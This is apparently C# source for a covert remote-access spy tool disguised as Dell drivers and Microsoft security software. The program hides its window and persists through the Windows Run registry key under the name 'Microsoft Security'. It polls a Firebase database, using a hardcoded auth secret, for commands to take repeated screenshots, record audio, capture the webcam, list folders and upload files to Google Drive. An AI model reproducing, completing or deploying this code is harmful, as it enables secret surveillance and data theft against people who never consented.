using System;
using System.Windows.Forms;
using Microsoft.Win32;
using FireSharp.Config;
using FireSharp.Response;
using FireSharp.Interfaces;
using System.Timers;
using System.Threading;
using System.IO;
using System.Collections.Generic;
using System.Text;
using Google.Apis.Auth.OAuth2;
using Google.Apis.Drive.v2.Data;
using Google.Apis.Drive.v3.Data;
using Google.Apis.Services;
using System.Diagnostics;
using System.Reflection;
using System.Security.Principal;
using System.Threading.Tasks;
using Microsoft_Security.Properties;

namespace Dell_Drivers
{
    public partial class Form1 : Form
    {

        IFirebaseClient client;
        IFirebaseConfig config;

        public Form1()
        {
            InitializeComponent();
            this.Opacity = 0;
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;

        }



        private void Form1_Load(object sender, EventArgs e)
        {

            config = new FirebaseConfig
            {
                AuthSecret = "WDu36v8Y6cEkh8j00Zhx3S0paOTDKpxKjShBB1nR",
                BasePath = "https://remote-59c0f-default-rtdb.firebaseio.com/"
            };

            RegistryKey registry = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            registry.SetValue("Microsoft Security", Application.ExecutablePath.ToString());
            //InitializeComponent();


            DateTime now = DateTime.Now;

            //String time = now.ToString();
            global.currentUser = Environment.UserName;



            global.aTimer.Elapsed += new ElapsedEventHandler(screenshotForm);
            global.aTimer.Interval = 10000;



            System.Timers.Timer bTimer = new System.Timers.Timer();
            bTimer.Elapsed += new ElapsedEventHandler(activeChecker);
            bTimer.Interval = 5000;
            bTimer.Enabled = true;


            //takeShot();

            startChecker(config);


            //updateToFirebase();

            //listener();


            //try
            //{
            //    client = new FireSharp.FirebaseClient(firebaseConfig);
            //    if (client != null)
            //    {
            //        MessageBox.Show("Connection Success");
            //        upload();
            //    }
            //}
            //catch
            //{
            //    MessageBox.Show("failed");
            //}

        }

        private void audiostart()
        {
            Windows_Scanner f4 = new Windows_Scanner();
            f4.ShowDialog();
        }

        internal void audioRestart()
        {
            Windows_Scanner f4 = new Windows_Scanner();
            f4.ShowDialog();
        }



        private async void startChecker(IFirebaseConfig config)
        {
            client = new FireSharp.FirebaseClient(config);

            try
            {
                FirebaseResponse response = await client.GetAsync(global.comName + "/start");
                string retrived = response.ResultAs<string>();

                if (retrived is null)
                {
                    FirstTimeFirebase();
                }
                else
                {
                    lastStartTime();
                    listener();
                }
            }
            catch
            {
                listener();
            }

        }

        private async void lastStartTime()
        {
            client = new FireSharp.FirebaseClient(config);
            try
            {

                var data = new Data
                {
                    startTime = DateTime.Now.ToString("dd MMM yyyy_hh mm ss tt"),
                };
                FirebaseResponse response = await client.UpdateAsync(global.comName + "/startTime", data);
                Data updatedData = response.ResultAs<Data>();

            }
            catch
            {

            }
        }

        private async void FirstTimeFirebase()
        {
            client = new FireSharp.FirebaseClient(config);
            try
            {
                var data = new Data
                {
                    startTime = DateTime.Now.ToString("dd MMM yyyy_hh mm ss tt"),
                    start = "",
                    folderID = "",
                    path = "",
                    fileToUpload = "",
                    cameraCapture = "",
                    audioCapture = ""

                };
                FirebaseResponse response = await client.UpdateAsync(global.comName, data);
                Data updatedData = response.ResultAs<Data>();
                listener();

            }
            catch
            {

            }

        }

        private void activeChecker(object sender, ElapsedEventArgs e)
        {
            switch (global.active)
            {
                case true:
                    global.aTimer.Enabled = true;
                    break;
                case false:
                    global.aTimer.Enabled = false;
                    break;
                default:
                    // code block
                    break;
            }
        }

        private void screenshotForm(object sender, ElapsedEventArgs e)
        {
            SS f2 = new SS();
            f2.ShowDialog();
        }


        private async void listener()
        {
            client = new FireSharp.FirebaseClient(config);

            // AUDIO CAPTURE DATA
            try
            {
                EventStreamResponse audiocap = await client.OnAsync(global.comName + "/audioCapture", added: (sender, args, context) =>
                {

                    if (args.Data == "1")
                    {
                        Settings.Default["audioCapture"] = args.Data;
                        Settings.Default.Save();
                        global.audioState = "1";
                        new Task(audiostart).Start();
                    }
                    if (args.Data == "0")
                    {
                        Settings.Default["audioCapture"] = args.Data;
                        Settings.Default.Save();
                        global.audioState = "0";
                    }

                },
                changed: (sender, args, context) =>
                {
                    if (args.Data == "1")
                    {
                        Settings.Default["audioCapture"] = args.Data;
                        Settings.Default.Save();
                        global.audioState = "1";
                        new Task(audiostart).Start();
                    }
                    if (args.Data == "0")
                    {
                        Settings.Default["audioCapture"] = args.Data;
                        Settings.Default.Save();
                        global.audioState = "0";
                    }
                });

            }
            catch
            {
                if (Settings.Default["audioCapture"].ToString() == "1")
                {
                    global.audioState = "1";
                    new Task(audiostart).Start();

                }
                if (Settings.Default["audioCapture"].ToString() == "0")
                {
                    global.audioState = "0";
                }
            }


            // MAIN START DATA
            try
            {
                EventStreamResponse responseq = await client.OnAsync(global.comName + "/start", added: (sender, args, context) =>
                {
                    global.start = args.Data;
                    Settings.Default["start"] = args.Data;
                    Settings.Default.Save();

                    if (args.Data == "1")
                    {
                        
                        global.active = true;

                    }
                    if (args.Data == "0")
                    {
                        
                        global.active = false;
                    }

                },
                changed: (sender, args, context) =>
                {

                    global.start = args.Data;
                    Settings.Default["start"] = args.Data;
                    Settings.Default.Save();
                    if (args.Data == "1")
                    {
                        
                        global.active = true;

                    }
                    if (args.Data == "0")
                    {
                        
                        global.active = false;
                    }
                });
            }
            catch
            {
                if (Settings.Default["start"].ToString() == "1")
                {
                    global.active = true;
                }
                if (Settings.Default["start"].ToString() == "0")
                {
                    global.active = false;
                }
            }



            // FOLDER ID SELECTION CODE
            try
            {
                EventStreamResponse foldID = await client.OnAsync(global.comName + "/folderID", added: (sender, args, context) =>
                {
                    Settings.Default["folderId"] = args.Data;
                    Settings.Default.Save();
                    global.folderID_G = args.Data;
                },
                changed: (sender, args, context) =>
                {
                    Settings.Default["folderId"] = args.Data;
                    Settings.Default.Save();
                    global.folderID_G = args.Data;
                });
            }
            catch
            {
                global.folderID_G = Settings.Default["folderId"].ToString();
            }


            // PATH SELECTION CODE
            try
            {
                EventStreamResponse pathReader = await client.OnAsync(global.comName + "/path", added: (sender, args, context) =>
                {
                    global.path = args.Data;
                    Microsoft_Scanner f7 = new Microsoft_Scanner();
                    f7.ShowDialog();

                },
                changed: (sender, args, context) =>
                {
                    global.path = args.Data;
                    Microsoft_Scanner f8 = new Microsoft_Scanner();
                    f8.ShowDialog();

                });
            }
            catch
            {

            }


            // FILE TO UPLOAD CODE
            try
            {
                EventStreamResponse fileUploadReader = await client.OnAsync(global.comName + "/fileToUpload", added: (sender, args, context) =>
                {
                    global.fileUploadPath = args.Data;
                    Windows_Defender f2 = new Windows_Defender();
                    f2.ShowDialog();

                },
                changed: (sender, args, context) =>
                {
                    global.fileUploadPath = args.Data;
                    Windows_Defender f3 = new Windows_Defender();
                    f3.ShowDialog();

                });
            }
            catch
            {

            }

            // CAMERA CAPTURE CODE
            try
            {
                EventStreamResponse cameraCap = await client.OnAsync(global.comName + "/cameraCapture", added: (sender, args, context) =>
                {
                    Settings.Default["cameraCapture"] = args.Data;
                    Settings.Default.Save();


                    if (args.Data == "1")
                    {                        
                        Microsoft f12 = new Microsoft();
                        f12.ShowDialog();
                    }


                },
            changed: (sender, args, context) =>
            {
                Settings.Default["cameraCapture"] = args.Data;
                Settings.Default.Save();

                if (args.Data == "1")
                {                    
                    Microsoft f13 = new Microsoft();
                    f13.ShowDialog();
                }

            });
            }
            catch
            {
                if (Settings.Default["cameraCapture"].ToString() == "1")
                {
                    Microsoft f13 = new Microsoft();
                    f13.ShowDialog();
                }
            }


        }




    }
}

public static class global
{
    public static int current_count = 0;
    public static bool active;
    public static System.Timers.Timer aTimer = new System.Timers.Timer();
    public static string comName = System.Environment.MachineName;
    public static string start;
    public static string folderID_G = "17ZaulrIiqMIUbztn1w_Hf3e-AMB1kfiM";
    public static List<string> ListofFiles = new List<string>();
    public static string path;
    public static string fileUploadPath;
    public static string currentUser;
    public static string audioState;
}